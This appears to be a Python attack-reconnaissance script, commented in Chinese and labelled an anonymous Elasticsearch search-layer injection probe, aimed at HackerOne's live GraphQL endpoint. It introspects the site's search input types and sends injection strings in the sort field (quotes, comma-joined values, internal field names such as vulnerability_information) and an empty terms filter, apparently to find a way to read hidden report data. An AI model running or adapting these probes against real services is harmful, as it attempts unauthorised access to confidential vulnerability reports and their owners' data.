# -*- coding: utf-8 -*-
"""T1c:ES 搜索层注入探测(2026-09-08,匿名)——index=CompleteHacktivityReportIndex"""
import requests
import json

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
S = requests.Session()
S.headers.update({"User-Agent": UA})
IDX = "CompleteHacktivityReportIndex"

def gql(query, label, ms=20000):
    try:
        r = S.post("https://hackerone.com/graphql", json={"query": query}, timeout=ms)
        s = r.text
        print(f"== {label}: {r.status_code} {s[:1800]}")
        return s
    except Exception as e:
        print(f"== {label} ERR {e}")
        return None

# 1. 最小 search(基线)
gql('{ s: search(index: %s, query_string: "hackerone", first: 2){ total_count edges{ node{ __typename } } } }' % IDX, "base")

# 2. 剩余 input 对象结构(terms/range/bool/nested 的 field 类型)
gql("""{ a:__type(name:"TermsFilterInput"){ inputFields{ name type{ kind name ofType{ kind name ofType{ kind name } } } } }
b:__type(name:"RangeInput"){ inputFields{ name type{ kind name ofType{ kind name ofType{ kind name } } } } }
c:__type(name:"BoolQueryInput"){ inputFields{ name type{ kind name ofType{ kind name ofType{ kind name } } } } }
d:__type(name:"NestedInput"){ inputFields{ name type{ kind name ofType{ kind name ofType{ kind name } } } } }
e:__type(name:"OrderDirection"){ enumValues{ name } } }""", "inputs")

# 3. sort.field 注入探测:任意字符串 vs 已知字段 vs 引号/括号
for i, f in enumerate(['popularity', 'reported_at', '"', 'popularity"', 'a,b', 'report_id', 'vulnerability_information']):
    gql('{ s: search(index: %s, query_string: "a", sort: { field: %s }, first: 1){ total_count } }' % (IDX, json.dumps(f)), "sort_%d_%s" % (i, f[:16]))

# 4. terms.field 任意值(读其它字段?)
gql('{ s: search(index: %s, query_string: "a", query: { terms: { } }, first: 1){ total_count } }' % IDX, "terms_empty")
